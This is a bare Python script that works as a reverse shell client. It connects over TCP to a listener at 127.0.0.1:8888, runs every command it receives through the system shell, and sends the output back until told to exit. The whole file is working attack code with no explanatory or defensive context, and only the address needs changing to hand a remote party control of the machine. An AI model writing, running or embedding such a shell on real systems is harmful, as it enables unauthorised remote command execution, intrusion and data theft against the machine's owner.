import socket
import subprocess


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


s.connect(('127.0.0.1', 8888))


while True:
    command = s.recv(4096).decode()
    if command.lower() == 'exit':
        break
    output = subprocess.getoutput(command)
    s.send(output.encode())


s.close()
